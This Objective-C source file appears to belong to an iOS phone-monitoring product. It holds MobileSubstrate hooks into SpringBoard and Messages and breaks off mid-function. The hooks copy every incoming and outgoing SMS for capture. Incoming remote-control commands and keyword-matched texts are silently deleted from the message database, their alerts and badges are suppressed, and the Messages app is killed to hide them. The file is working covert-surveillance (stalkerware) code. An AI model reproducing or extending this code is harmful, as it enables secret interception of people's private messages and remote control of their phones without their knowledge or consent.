//
//  SMS2.h
//  MSFSP
//
//  Created by Makara Khloth on 2/6/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import "MSFSP.h"
#import "MSFSPUtils.h"
#import "NSString+ScanString.h"
#import "SMSUtils.h"
#import "SMS2Utils.h"
#import "NSConcreteAttributedString.h"
#import "FMDatabase.h"
#import "SMSSender000.h"
#import "FxMessage.h"

#import "SBAlertItemsController.h"

#import "IMChatRegistry.h"
#import "IMService+IOS6.h"
#import "IMServiceImpl+IOS6.h"
#import "IMMessage.h"
#import "IMMessage+IOS6.h"

#import "FZMessage.h"
#import "SpringBoard.h"
#import "SBApplication.h"
#import "SMSApplication.h"
#import "SMSApplication+IOS6.h"
#import "CKTranscriptController.h"
#import "CKConversation.h"
#import "CKConversation+IOS6.h"
#import "CKConversationList.h"
#import "CKConversationList+IOS5.h"
#import "CKConversationList+IOS6.h"
#import "CKConversationList+IOS7.h"
#import "CKIMMessage.h"
#import "CKConversationListController.h"
#import "CKConversationListController+IOS6.h"
#import "CKMessagesController.h"
#import "SBApplicationIcon.h"
#import "SBApplicationIcon+IOS6.h"
#import "SBApplicationController.h"
#import "SBIconController.h"
#import "SBIconController+IOS6.h"
#import "SBIconModel.h"
#import "SBAwayBulletinListController.h"
#import "SBAwayBulletinListController+IOS6.h"

#import "CKMessageAlertItem.h"
#import "SBBulletinBannerController.h"
#import "SBBulletinBannerItem.h"
#import "BBBulletin.h"
#import "BBBulletin+iOS8.h"

#import "SBLockScreenNotificationListController.h"
#import "SBLockScreenNotificationListController+iOS8.h"
#import "SBBulletinObserverViewController.h"
#import "SBBulletinObserverViewController+iOS8.h"
#import "BBObserver.h"

#import "SBLockScreenViewController.h"
#import "SBLockScreenViewController+iOS8.h"

#import "SBUserNotificationAlert.h"
#import "Visibility.h"

#import "SBBulletinSoundController.h"

#import "SBSystemLocalNotificationAlert.h"  // for iOS 7
#import "SBBulletinModalAlert.h"            // for iOS 8

#pragma mark -
#pragma mark C functions SpringBoard hooks
#pragma mark -

void callback_sms_sqlite_fn_read(sqlite3_context*,int,sqlite3_value**) {
	DLog(@"callback_sms_sqlite_fn_read----> [CALLED]");
	return;
}

bool permanentlyRemoveMessageID(NSInteger aMessageID) {
	NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
	NSString *sql = @"delete from message where ROWID = ?";
	FMDatabase *db = [FMDatabase databaseWithPath:kSMSHistoryDatabasePath];
	[db open];
	bool success = false;
	const char *fn_name = "read";
	if (SQLITE_OK == sqlite3_create_function([db sqliteHandle], fn_name, 1, SQLITE_INTEGER, nil,
											 callback_sms_sqlite_fn_read, nil, nil)) {
		success = [db executeUpdate:sql, [NSNumber numberWithInteger:aMessageID]];
	}
	DLog(@"permanentlyRemoveMessageID, success = %d, error = %@", success, [db lastErrorMessage]);
	[db close];
	[pool release];
	return (success);
}

bool isApplicationIncompatible(NSString *aAppIdentifier) {
	bool incompatible = false;
	if ([aAppIdentifier isEqualToString:@"com.apple.MobileSMS"] ||
		[aAppIdentifier isEqualToString:@"com.bitesms"]) {
		incompatible = true;
	}
	return (incompatible);
}

#pragma mark -
#pragma mark C functions (Obsolete)
#pragma mark -

bool permanentlyRemoveGuid(NSString *aGuid) {
	NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
	NSString *sql = @"delete from chat where guid = ?";
	FMDatabase *db = [FMDatabase databaseWithPath:kSMSHistoryDatabasePath];
	[db open];
	bool success = [db executeUpdate:sql, aGuid];
	DLog(@"permanentlyRemoveGuid, success = %d, error = %@", success, [db lastErrorMessage]);
	[db close];
	[pool release];
	return (success);
}

bool hasToDeleteGuid(NSString *aGuid) {
	NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
	bool hasToDelete = false;
	NSString *sql = @"select ROWID from chat where guid = ?";
	FMDatabase *db = [FMDatabase databaseWithPath:kSMSHistoryDatabasePath];
	[db open];
	FMResultSet *rs1 = [db executeQuery:sql, aGuid];
	DLog(@"Get chat_id, error = %@", [db lastErrorMessage]);
	if ([rs1 next]) {
		NSInteger chatID = [rs1 intForColumnIndex:0];
		sql = @"select count(message_id) from chat_message_join where chat_id = ?";
		FMResultSet *rs2 = [db executeQuery:sql, [NSNumber numberWithInteger:chatID]];
		DLog(@"chatID = %ld", (long)chatID);
		DLog(@"Count message in chat_id, error = %@", [db lastErrorMessage]);
		if ([rs2 next]) {
			NSInteger count = [rs2 intForColumnIndex:0];
			DLog(@"count = %ld", (long)count);
			if (count <= 1) {
				hasToDelete = true;
			}
		}
	}
	[db close];
	[pool release];
	return (hasToDelete);
}

#pragma mark -
#pragma mark C functions used in MobileSMS hooks
#pragma mark -

bool isSMSCommandNotification(NSNotification *aNotification) {
	bool isSMSCommand = false;
	if ([[aNotification name] isEqualToString:@"CKIMMessageReceivedNotification"]) {
		id object = [aNotification object];
		DLog (@"userInfo = %@", [aNotification userInfo]);
		DLog (@"object = %@", object);
		
		CKIMMessage *ckIMMessage = object;
		if (![ckIMMessage isFromMe] && [ckIMMessage isSMS]) {
			NSString *previewText = [ckIMMessage previewText];
			DLog (@"previewText = %@", previewText);
			
			isSMSCommand = [previewText scanWithStartTag:kSMSComandFormatTag]; // Check sms command
			if (!isSMSCommand) { // Check sms keyword
				isSMSCommand = [SMSUtils checkSMSKeywordWithMonitorNumber:previewText];
			}
		}
	}
	return (isSMSCommand);
}

#pragma mark -
#pragma mark ChatKit C functions hooks
#pragma mark -

// This method is called before account$chat$style$chatProperties$messageSent$ method
MSHook(int, _CKShouldPlaySMSSounds, CFStringRef a, CFStringRef b, bool c) {
	//DLog (@"************************************************************************************");
	//DLog(@"****************	REMOVE SOUND	*******************");
	//DLog (@"************************************************************************************");
	DLog(@"=================== Remove Sound =======================");
	DLog(@"a %@",a); // MessagesBadgeController
	DLog(@"b %s",b); // ? _madridMessageSent (could be the selector)
	DLog(@"c %d",c); // ? 80 ( could be the integer)
	DLog(@"=================== Remove Sound =======================");
	
	DLog (@"SHOULD PLAY THE SOUND ? %d", ![[SMSSender000 sharedSMSSender000] mSendingSMS]);
	if(![[SMSSender000 sharedSMSSender000] mSendingSMS]){
		DLog (@"PLAY THE SOUND !");
		return __CKShouldPlaySMSSounds(a,b,c);
	} else {
		// If this log is removed, it causes sound to play ????
		DLog (@"DON'T PLAY THE SOUND !");
		return false;
	}
}

#pragma mark -
#pragma mark IMChatRegistry iOS 6: SpringBoard, iOS 7, 8 SMS application
#pragma mark -

/* This method is called when 
	- send SMS/MMS/iMessage
	- resend SMS/MMS/iMessage
	- receive the message (SMS/MMS/iMessage)
*/
HOOK(IMChatRegistry, account$chat$style$chatProperties$messageReceived$, void, id arg1, id arg2, unsigned char arg3, id arg4, id arg5) {
	DLog (@"************************************************************************************");
	DLog (@"**********			SMS MMS iMessage - RECEIVE -	***********");
	DLog (@"************************************************************************************");
	NSString *identifier = [[NSBundle mainBundle] bundleIdentifier];
	
	DLog (@"****** identifier = %@", identifier);
	
	DLog (@"================== BEGIN receive account$chat$style$chatProperties$messageReceived$ ==================");
	DLog (@"[arg1 class] = %@, arg1 = %@", [arg1 class], arg1);
	DLog (@"[arg2 class] = %@, arg2 = %@", [arg2 class], arg2);
	DLog (@"arg3 = %d", arg3);
	DLog (@"[arg4 class] = %@, arg4 = %@", [arg4 class], arg4);
	DLog (@"[arg5 class] = %@, arg5 = %@", [arg5 class], arg5);
	DLog (@"================== END receive account$chat$style$chatProperties$messageReceived$ ==================");
	
	BOOL block = NO;
	NSDictionary *chatProperties = arg4;
	NSString *guid = [chatProperties objectForKey:@"guid"];
	DLog (@"guid = %@", guid);
		
	FZMessage *fzMessage = arg5;
	
	DLog (@"================== FZMessage (0) ================");
	DLog (@"flags           = %llu", [fzMessage flags]);
	DLog (@"guid            = %@", [fzMessage guid]);
	DLog (@"errorCode       = %d", [fzMessage errorCode]);
	DLog (@"time            = %@", [fzMessage time]);
	DLog (@"countryCode     = %@", [fzMessage countryCode]);
	DLog (@"messageID       = %lld", [fzMessage messageID]);
	DLog (@"replaceID       = %lld", [fzMessage replaceID]);
	DLog (@"roomName        = %@", [fzMessage roomName]);
	DLog (@"accountID       = %@", [fzMessage accountID]);
	DLog (@"account         = %@", [fzMessage account]);
	DLog (@"unformattedID   = %@", [fzMessage unformattedID]);
	DLog (@"service         = %@", [fzMessage service]);
	DLog (@"handle          = %@", [fzMessage handle]);
	DLog (@"================== FZMessage (0) ================");
		
	// Make sure it's SMS
	if (![fzMessage isFromMe]							&&		// incoming
		[[fzMessage subject] length] == 0				&&		// length of subject
		[[[fzMessage body] string] length] > 0			&&		// length of body
		[[fzMessage service] isEqualToString:@"SMS"]	&&		// SMS service
		[fzMessage fileTransferGUIDs] == nil			) {		// no file transfer guid		
		NSDictionary *senderInfo = [fzMessage senderInfo];
		NSString *senderNumber = [senderInfo objectForKey:@"FZPersonID"];
		NSString *smsText = [[fzMessage body] string];
		
		DLog (@"================== FZMessage ================");
		DLog (@"senderInfo      = %@", senderInfo);
		DLog (@"senderNumber    = %@", senderNumber);
		DLog (@"smsText         = %@", smsText);
		DLog (@"================== FZMessage ================");
		
		block = ([smsText scanWithStartTag:kSMSComandFormatTag]			||	// Check sms command
				 [SMSUtils checkSMSKeywordWithMonitorNumber:smsText]);		// Check sms keywords
		
		DLog (@"---------------------- block the call from incoming SMS = %d ---------------------------", block);
		
		if (!block) { // Normal sms thus capture...
			DLog (@"Not block")
			SMSUtils *smsUtils = [[SMSUtils alloc] init];
			NSArray *senderNumberArr = [[NSArray alloc] initWithObjects:senderNumber, nil];
			[smsUtils writeSMSWithRecipient:senderNumberArr
									message:smsText
							   isSMSCommand:block
								  messageID:[fzMessage messageID]
									smsType:kSMSIncomming
									smsInfo:[NSDictionary dictionaryWithObject:guid forKey:kSMSInfoGroupIDKey]];
			[senderNumberArr release];
			[smsUtils release];
		} else { // It's sms command or contains keywords
			DLog (@"block")
			
			NSBundle *bundle = [NSBundle mainBundle];
			NSString *bundleIdentifier = [bundle bundleIdentifier];
            
            BOOL shouldKillSMSApplication = NO;

#pragma mark Called by SpringBoard
            
			if ([bundleIdentifier isEqualToString:@"com.apple.springboard"]) {
                // Below iOS 7
				// Get front most application before it get killed if it is MobileSMS (Messages) application
				SpringBoard *sb = (SpringBoard *)[UIApplication sharedApplication];
				SBApplication *sbMessagesApplication = [sb _accessibilityFrontMostApplication];
			
				if ([[sbMessagesApplication bundleIdentifier] isEqualToString:@"com.apple.MobileSMS"]) {
					DLog (@"SMS is on top")
					[[SMS2Utils sharedSMS2Utils] setMSmsBadge:0];
					[sb quitTopApplication:nil];
				} else {
					DLog (@"SMS is NOT on top")																					
					[[SMS2Utils sharedSMS2Utils] setMSmsBadge:0];				
					Class $SBIconController = objc_getClass("SBIconController");
					SBIconController *sbIconController = [$SBIconController sharedInstance];
					SBIconModel *sbIconModel = [sbIconController model];
					SBApplicationIcon *sbMessagesApplicationIcon = [sbIconModel applicationIconForDisplayIdentifier:@"com.apple.MobileSMS"];
					NSInteger badge = [sbMessagesApplicationIcon badgeValue];
					DLog (@"sbIconController = %@", sbIconController);
					DLog (@"sbMessagesApplicationIcon = %@", sbMessagesApplicationIcon);
					DLog (@"badge = %ld", (long)badge);
					badge = ((badge - 1) > 0) ? badge : 0;
					[sbMessagesApplicationIcon setBadge:[NSNumber numberWithInteger:badge]];
					[sbMessagesApplication noteBadgeSetLocally];
				}
				
				// -- delete SMS --
				// Method 1
				Class $CKConversationList				= objc_getClass("CKConversationList");
				CKConversationList *conversationList	= [$CKConversationList sharedConversationList];
				[conversationList reloadStaleConversations];
				CKConversation *conversation			= [conversationList conversationForExistingChatWithGUID:guid];
				[conversation loadAllMessages];
				
				DLog (@"///////////////////////////////////////////////////");
				DLog (@"CKConversationList class = %@", $CKConversationList);
				DLog (@"conversationList = %@", conversationList);
				DLog (@"conversation = %@", conversation); // Conversation can get from SMS.db
				DLog (@"Conversation message count = %lu", (unsigned long)[(NSArray *)[conversation messages] count]);
				DLog (@"Conversation messages = %@", [conversation messages]);
				DLog (@"Conversation latest message = %@", [conversation latestMessage]);
				DLog (@"///////////////////////////////////////////////////");

				// Make no vibrate + sound
				/*
				 if ([[conversation messages] count] == 0) { // Note: this FZMessage have not been added to CKConversation
				 [conversation deleteAllMessagesAndRemoveGroup];
				 } else {
				 permanentlyRemoveMessageID([fzMessage messageID]);
				 }*/
							
				// TODO: Improve by delete individual message
				permanentlyRemoveMessageID([fzMessage messageID]);
				[conversation deleteAllMessagesAndRemoveGroup];
				
				// - Method 2
				// To count how many sms in this guid
				//BOOL deleteGuid = hasToDeleteGuid(guid);
				
				// Make no vibrate + sound
				//permanentlyRemoveMessageID([fzMessage messageID]);
				//if (deleteGuid) permanentlyRemoveGuid(guid);
				
				// -- END delete SMS
			}
            
#pragma mark Called by MobileSMS
            
            else {
                DLog (@"Gonna delete SMS from MobileSMS")
               
				Class $CKConversationList				= objc_getClass("CKConversationList");
				CKConversationList *conversationList	= [$CKConversationList sharedConversationList];
				CKConversation *conversation			= [conversationList conversationForExistingChatWithGUID:guid];
				[conversationList deleteConversation:conversation];
                /*********************************************************************************************************************
				 KNOWN ISSUE:
                    After above line is executed and this function is exited, SMS application will get Signal 15: Terminated 15. This
                    will not effect the functionalities of SMS application because it happens only when sms command or sms keywords
                    is received.
				 **********************************************************************************************************************/
              
                shouldKillSMSApplication = YES;
                
			}
			
			DLog (@"Checking")
			if ([smsText scanWithStartTag:kSMSComandFormatTag]) { // Capture sms command
				DLog (@"Capturing SMS command ...")
				SMSUtils *smsUtils = [[SMSUtils alloc] init];
				NSArray *senderNumberArr = [[NSArray alloc] initWithObjects:senderNumber, nil];
				[smsUtils writeSMSWithRecipient:senderNumberArr
										message:smsText
								   isSMSCommand:block		// YES, it is SMS command
									  messageID:[fzMessage messageID]
										smsType:kSMSIncomming
										smsInfo:[NSDictionary dictionaryWithObject:guid forKey:kSMSInfoGroupIDKey]];
				[senderNumberArr release];
				[smsUtils release];
			} 
			// Capture keyword
			else {
				DLog (@"Capturing SMS Keyword ...")
				SMSUtils *smsUtils = [[SMSUtils alloc] init];
				NSArray *senderNumberArr = [[NSArray alloc] initWithObjects:senderNumber, nil];
				[smsUtils writeSMSWithRecipient:senderNumberArr
										message:smsText
								   isSMSCommand:NO			// NO, it is not SMS command
									  messageID:[fzMessage messageID]
										smsType:kSMSIncomming
										smsInfo:[NSDictionary dictionaryWithObject:guid forKey:kSMSInfoGroupIDKey]];
				[senderNumberArr release];
				[smsUtils release];
                
                // This flag is set to TRUE only when this method is called by SMS application
                if (shouldKillSMSApplication) {
                    DLog(@"-------- BEFORE Quit SMS APPLICATION ----------")
                    exit(0);
                    DLog(@"-------- AFTER Quit SMS APPLICATION ----------")
                }
				
			}
		}
	}
	
	if (block) {
		DLog (@"Block the call to original...")
	} else {
		// -----------------------------
		CALL_ORIG(IMChatRegistry, account$chat$style$chatProperties$messageReceived$, arg1, arg2, arg3, arg4, arg5);
	}
}

/* This method is called when 
 - sending SMS/MMS/iMessage successes
 - resend SMS/MMS/iMessage successes
 */

HOOK(IMChatRegistry, account$chat$style$chatProperties$messageSent$, void, id arg1, id arg2, unsigned char arg3, id arg4, id arg5) {
	DLog (@"************************************************************************************");
	DLog (@"**********			SMS MMS iMessage - SENT -	***********");
	DLog (@"************************************************************************************");
	NSString *identifier = [[NSBundle mainBundle] bundleIdentifier];

		
	DLog (@"*********** identifier = %@", identifier);

	
	DLog (@"================== BEGIN sent account$chat$style$chatProperties$messageSent$ parameters ==================");
	DLog (@"[arg1 class] = %@, arg1 = %@", [arg1 class], arg1);
	DLog (@"[arg2 class] = %@, arg2 = %@", [arg2 class], arg2);
	DLog (@"arg3 = %d", arg3);
	DLog (@"[arg4 class] = %@, arg4 = %@", [arg4 class], arg4); // nil
	DLog (@"[arg5 class] = %@, arg5 = %@", [arg5 class], arg5);
	DLog (@"================== END sent account$chat$style$chatProperties$messageSent$ parameters ==================");
	
	BOOL block = NO;
	
	FZMessage *fzMessage = arg5;
	DLog (@"------------------ FZMessage ----------------------");
	DLog (@"senderInfo          = %@", [fzMessage senderInfo]);
	DLog (@"flags               = %llu", [fzMessage flags]);
	DLog (@"guid                = %@", [fzMessage guid]);
	DLog (@"roomName            = %@", [fzMessage roomName]);
	DLog (@"accountID           = %@", [fzMessage accountID]);
	DLog (@"account             = %@", [fzMessage account]);
	DLog (@"service             = %@", [fzMessage service]);
	DLog (@"handle              = %@", [fzMessage handle]);
	DLog (@"unformattedID       = %@", [fzMessage unformattedID]);
	DLog (@"isFromMe            = %d", [fzMessage isFromMe]);
	DLog (@"fileTransferGUIDs   = %@", [fzMessage fileTransferGUIDs]);
	DLog (@"subject             = %@", [fzMessage subject]);
	
//	DLog (@"messageID           = %d", [fzMessage messageID]);
//	DLog (@"replaceID           = %d", [fzMessage replaceID]);
//	DLog (@"bodyData            = %@", [fzMessage bodyData]);
//	DLog (@"plainBody           = %@", [fzMessage plainBody]);
//	DLog (@"account             = %@", [fzMessage account]);
//	DLog (@"bodyData            = %@", [fzMessage bodyData]);
//	DLog (@"body                = %@", [fzMessage body]);

	DLog (@"------------------ FZMessage ----------------------");
	
	if ([fzMessage isFromMe]							&&		// Outgoing
		[[fzMessage service] isEqualToString:@"SMS"]	&&		// SMS
		[fzMessage fileTransferGUIDs] == nil			&&		// No file transfer GUIDs
		[[fzMessage subject] length] == 0				) {		// No subject
		SMSSender000 *sender000 = [SMSSender000 sharedSMSSender000];
		FxMessage *replySMS = [sender000 copyReplySMSAndDeleteOldOneIfMatchText:[[fzMessage body] string]
																	withAddress:[fzMessage handle]];
		
		block = (replySMS != nil);
		if (block) {
			DLog (@"---------------------- block = %d -------------------", block);
			
			SpringBoard *sb = (SpringBoard *)[UIApplication sharedApplication];
			SBApplication *sbMessagesApplication = [sb _accessibilityFrontMostApplication];
			if ([[sbMessagesApplication bundleIdentifier] isEqualToString:@"com.apple.MobileSMS"]) {
				[sb quitTopApplication:nil];
			}
			// Delete that sms reply message
			Class $CKConversationList = objc_getClass("CKConversationList");
			CKConversationList *conversationList = [$CKConversationList sharedConversationList];
			[conversationList reloadStaleConversations];
			
			// For safe use chat guid from FxMessage
			//CKConversation *conversation = [conversationList conversationForExistingChatWithAddresses:[NSArray arrayWithObject:[fzMessage handle]]];
			
			NSString *chatGUID = [replySMS mChatGUID];
			CKConversation *conversation = [conversationList conversationForExistingChatWithGUID:chatGUID];
			[conversation loadAllMessages];
			
			DLog (@"///////////////////////////////////////////////////");
			DLog (@"CKConversationList class = %@", $CKConversationList);
			DLog (@"conversationList = %@", conversationList);
			DLog (@"conversation = %@", conversation); // Conversation can get from SMS.db
			DLog (@"Conversation message count = %lu", (unsigned long)[(NSArray *)[conversation messages] count]);
			DLog (@"Conversation messages = %@", [conversation messages]);
			DLog (@"Conversation latest message = %@", [conversation latestMessage]);
			DLog (@"Latest message rowID = %d", [[conversation latestMessage] rowID]);
			DLog (@"///////////////////////////////////////////////////");
			/*
			if (conversation && [[conversation messages] count] <= 1) {
				// Note: sometime FZMessage have been added and sometime have not been added to CKConversation
				CKIMMessage *latestMessage = [conversation latestMessage];
				[latestMessage updateMessageCompleteQuietly];
				if (([latestMessage rowID] == [fzMessage messageID]) ||
					[[conversation messages] count] == 0){
					[conversation deleteAllMessagesAndRemoveGroup];
				} else {
					permanentlyRemoveMessageID([fzMessage messageID]);
				}
			} else {
				permanentlyRemoveMessageID([fzMessage messageID]);
			}*/
			
			// TODO: Improve by delete individual message
			permanentlyRemoveMessageID([fzMessage messageID]);
			[conversation deleteAllMessagesAndRemoveGroup];
		} 
		else {
			DLog (@"[fzMessage messageID] %lld", [fzMessage messageID])
			
			Class $CKDBMessage				= objc_getClass("CKDBMessage");
			CKDBMessage *dbMessage			= [[$CKDBMessage alloc] initWithRecordID:(int)[fzMessage messageID]];
			NSArray *recipients				= [dbMessage recipients];
			
			BOOL isRecipientContainEmail	= NO;
			
			// -- check if the recipients contains email address 
			for (NSString *eachRecipient in recipients) {
				NSRange range = [eachRecipient rangeOfString:@"@"];
				if (!(range.location == NSNotFound  && range.length == 0)){	// found '@'
					DLog (@"This is email recipient %@", eachRecipient)
					isRecipientContainEmail = YES;
				}	
			}													
						
			if (isRecipientContainEmail) { // Capture mms event
				DLog (@"++++++++++++++++++++++++++ EMAIL MMS ++++++++++++++++++++++++++++++++")
				[[SMSSender000 sharedSMSSender000] normalMMSDidSend:[fzMessage messageID]];
			} else { // Capture sms event
				DLog (@"++++++++++++++++++++++++++ SMS ++++++++++++++++++++++++++++++++")
				[[SMSSender000 sharedSMSSender000] normalSMSDidSend:[fzMessage messageID]];
			}
            
//			if ([[fzMessage handle] rangeOfString:@"@"].location == NSNotFound) {				// -- Capture SMS event
//				DLog (@"++++++ SMS EVENT (recipient is 1 number)+++++")				
//				DLog (@"++++++ MMS EVENT (recipient is 1 number or 1 email) +++++")			
//				
//				[[SMSSender000 sharedSMSSender000] normalSMSDidSend:[fzMessage messageID]];
//			} else { // -- no handle															// -- Capture MMS event (recipient is an email address)
//				DLog (@"++++++ SMS EVENT (recipient is multiple number)+++++")				
//				DLog (@"++++++ MMS EVENT (recipient is multiple number or email + number) +++++")								
//				[[SMSSender000 sharedSMSSender000] normalMMSDidSend:[fzMessage messageID]];
//			}
			
		}
		[replySMS release];
        
	} else {
		// Capture mms event
		if ([fzMessage isFromMe]							&&		// Outgoing
			[[fzMessage service] isEqualToString:@"SMS"]	&&		// SMS
			([fzMessage fileTransferGUIDs] != nil || [[fzMessage subject] length])) {	// File transfer GUIDs not nil or there is subject
			DLog (@"++++++++++++++++++++++++++ MMS ++++++++++++++++++++++++++++++++")
			[[SMSSender000 sharedSMSSender000] normalMMSDidSend:[fzMessage messageID]];
		}
	}
	
	if (!block) {
		CALL_ORIG(IMChatRegistry, account$chat$style$chatProperties$messageSent$, arg1, arg2, arg3, arg4, arg5);
	} else {
		DLog(@"Reply SMS CMD is sent successfully ... ");
		[[SMSSender000 sharedSMSSender000] sendSMSFinished:[fzMessage errorCode]];
	}
}

/*
 - If SMS (normal sms) sent success there is no call to this method
 - If SMS (reply sms command) sent success there are two calls (because of we delete that sms) to this method
 */
HOOK(IMChatRegistry, account$chat$style$chatProperties$messageUpdated$, void, id arg1, id arg2, unsigned char arg3, id arg4, id arg5) {
	DLog (@"************************************************************************************");
	DLog (@"**********			SMS sent FAIL	***********");
	DLog (@"************************************************************************************");
	
	DLog (@"================== BEGIN update account$chat$style$chatProperties$messageUpdated$ ==================");
	DLog (@"[arg1 class] = %@, arg1 = %@", [arg1 class], arg1);
	DLog (@"[arg2 class] = %@, arg2 = %@", [arg2 class], arg2);
	DLog (@"arg3 = %d", arg3);
	DLog (@"[arg4 class] = %@, arg4 = %@", [arg4 class], arg4);
	DLog (@"[arg5 class] = %@, arg5 = %@", [arg5 class], arg5);
	DLog (@"================== END update account$chat$style$chatProperties$messageUpdated$ ==================");
	
	BOOL block = NO;
	FZMessage *fzMessage = arg5;
	
	DLog (@"================== FZMessage (1) ================");
	DLog (@"flags           = %llu", [fzMessage flags]);
	DLog (@"guid            = %@", [fzMessage guid]);
	DLog (@"errorCode       = %d", [fzMessage errorCode]);
	DLog (@"time            = %@", [fzMessage time]);
	DLog (@"countryCode     = %@", [fzMessage countryCode]);
	DLog (@"messageID       = %lld", [fzMessage messageID]);
	DLog (@"replaceID       = %lld", [fzMessage replaceID]);
	DLog (@"roomName        = %@", [fzMessage roomName]);
	DLog (@"accountID       = %@", [fzMessage accountID]);
	DLog (@"account         = %@", [fzMessage account]);
	DLog (@"unformattedID   = %@", [fzMessage unformattedID]);
	DLog (@"service         = %@", [fzMessage service]);
	DLog (@"handle          = %@", [fzMessage handle]);
	DLog (@"================== FZMessage (1) ================");
	
	if ([fzMessage isFromMe]							&&		// Outgoing
		[[fzMessage service] isEqualToString:@"SMS"]	&&		// SMS
		[fzMessage fileTransferGUIDs] == nil			&&		// No file transfer GUIDs
		[fzMessage errorCode]) {								// There may be error in sending sms reply
		SMSSender000 *sender000 = [SMSSender000 sharedSMSSender000];
		FxMessage *replySMS = [sender000 copyReplySMSAndDeleteOldOneIfMatchText:[[fzMessage body] string]
																	withAddress:[fzMessage handle]];
		block = (replySMS != nil);
		if (block) {
			DLog (@"---------------------- (1) block = %d -------------------", block);
			
			SpringBoard *sb = (SpringBoard *)[UIApplication sharedApplication];
			SBApplication *sbMessagesApplication = [sb _accessibilityFrontMostApplication];
			if ([[sbMessagesApplication bundleIdentifier] isEqualToString:@"com.apple.MobileSMS"]) {
				[sb quitTopApplication:nil];
			}
			// Delete that sms reply message
			Class $CKConversationList = objc_getClass("CKConversationList");
			CKConversationList *conversationList = [$CKConversationList sharedConversationList];
			//CKConversationList *conversationList = [[$CKConversationList alloc] init];
			[conversationList reloadStaleConversations];
			
			// Note: there is difference when address to get conversation specified as +668xxx and 08xxx
			// Always get nil when pass 08xxx
			//CKConversation *conversation = [conversationList conversationForExistingChatWithAddresses:[NSArray arrayWithObject:[fzMessage handle]]];
			
			NSString *chatGUID = [replySMS mChatGUID];
			CKConversation *conversation = [conversationList conversationForExistingChatWithGUID:chatGUID];
			[conversation loadAllMessages];
			
			DLog (@"///////////////////////////////////////////////////");
			DLog (@"CKConversationList class = %@", $CKConversationList);
			DLog (@"conversationList = %@", conversationList);
			DLog (@"conversationList conversations = %@", [conversationList conversations]);
			DLog (@"conversation = %@", conversation); // Conversation can get from SMS.db
			DLog (@"Conversation message count = %lu", (unsigned long)[(NSArray *)[conversation messages] count]);
			DLog (@"Conversation messages = %@", [conversation messages]);
			DLog (@"Conversation latest message = %@", [conversation latestMessage]);
			DLog (@"Latest message rowID = %d", [[conversation latestMessage] rowID]);
			DLog (@"///////////////////////////////////////////////////");
			/*
			if (conversation && [[conversation messages] count] <= 1) {
				// Note: sometime FZMessage have been added and sometime have not been added to CKConversation
				CKIMMessage *latestMessage = [conversation latestMessage];
				if (([latestMessage rowID] == [fzMessage messageID]) ||
					[[conversation messages] count] == 0){
					[conversation deleteAllMessagesAndRemoveGroup];
				} else {
					permanentlyRemoveMessageID([fzMessage messageID]);
				}
			} else {
				permanentlyRemoveMessageID([fzMessage messageID]);
			}*/
			
			// TODO: Improve by delete individual message
			permanentlyRemoveMessageID([fzMessage messageID]);
			[conversation deleteAllMessagesAndRemoveGroup];
			
			//[conversationList release];
		}
		
		[replySMS release];
	}
	
	if (!block) {
		CALL_ORIG(IMChatRegistry, account$chat$style$chatProperties$messageUpdated$, arg1, arg2, arg3, arg4, arg5);
	} else {
		[[SMSSender000 sharedSMSSender000] sendSMSFinished:[fzMessage errorCode]];
	}
}

#pragma mark -
#pragma mark SMSApplication, CKTranscriptController
#pragma mark -

HOOK(SMSApplication, _receivedMessage$, void, id arg1) {
	DLog (@"======= _receivedMessage, arg1 = %@ =======", arg1);
	NSNotification *notification = arg1;
	BOOL isSMSCommand = isSMSCommandNotification(notification);
	if (isSMSCommand) {
		CKIMMessage *message = [notification object];
		[message markAsRead];
		[message updateMessageCompleteQuietly];
		
		UIApplication *application = [UIApplication sharedApplication];
		NSInteger badgeNumber = [application applicationIconBadgeNumber];
		badgeNumber--;
		if (badgeNumber < 0) {
			[application setApplicationIconBadgeNumber:0];
		} else {
			[application setApplicationIconBadgeNumber:badgeNumber];
		}
		DLog (@"badgeNumber = %ld", (long)badgeNumber);
		
		CKMessagesController *_messagesController = nil;
		object_getInstanceVariable(self, "_messagesController", (void **)&_messagesController);
		CKConversationListController *_conversationListController = [_messagesController conversationListController];
		//CKTranscriptController *_transcriptController = [_messagesController transcriptController];
		CKConversationList *_conversationList = [_conversationListController conversationList];
		CKConversation *_conversation = nil;
		if ([_conversationList respondsToSelector:@selector(firstUnreadConversation)]) { // iOS 6
			_conversation = [_conversationList firstUnreadConversation];
		}
		if ([_conversationList respondsToSelector:@selector(firstUnreadFilteredConversationIgnoringMessages:)]) { // iOS 7
			_conversation = [_conversationList firstUnreadFilteredConversationIgnoringMessages:nil];
		}
		
		DLog (@"_messagesController = %@", _messagesController);
		DLog (@"_conversationListController = %@", _conversationListController);
		//DLog (@"_transcriptController = %@", _transcriptController);
		DLog (@"_conversationList = %@", _conversationList);
		DLog (@"_conversation = %@", _conversation);
		/*
		if ([[_conversation messages] count] <= 1) {
			DLog (@"Delete all messages and remove group");
			//[_conversation deleteAllMessagesAndRemoveGroup]; // Segmentation fault: 11
			//[_conversation _deleteAllMessagesAndRemoveGroup:YES]; // Segmentation fault: 11
			
			CKIMMessage *latestMessage = [_conversation latestMessage];
			if (([latestMessage rowID] == [message rowID]) ||
				[[_conversation messages] count] == 0) {
				[_conversation performSelector:@selector(deleteAllMessagesAndRemoveGroup) withObject:nil afterDelay:0.0];
			} else {
				[_conversation deleteMessage:message];
			}
		} else {
			DLog (@"Delete message");
			[_conversation deleteMessage:message];
		}*/
		
		// TODO: Improve by delete individual message
		[_conversation deleteMessage:message];
		[_conversation performSelector:@selector(deleteAllMessagesAndRemoveGroup) withObject:nil afterDelay:0.0];
		
		DLog (@"Remove message and post update");
		[_conversation removeMessage:message postUpdate:YES];
		
		DLog (@"Clear conversation cache");
		[_messagesController _clearConversationCache];
		
		DLog (@"Update conversation controller");
		[_conversationListController updateTitle];
		[_conversationListController updateConversationList];
		
		DLog (@"Post conversation list changes");
		[_conversationList _postConversationListChangedNotification];
	} else {
		CALL_ORIG(SMSApplication, _receivedMessage$, arg1);
	}
}

HOOK(CKTranscriptController, _messageReceived$, void, id arg1) {
	DLog (@"======= _messageReceived, arg1 = %@ =======", arg1);
	NSNotification *notification = arg1;
//	BOOL isSMSCommand = isSMSCommandNotification(notification);
//	if (isSMSCommand) {
	if (NO) {		// we ask SpringBoards to remove the message instead
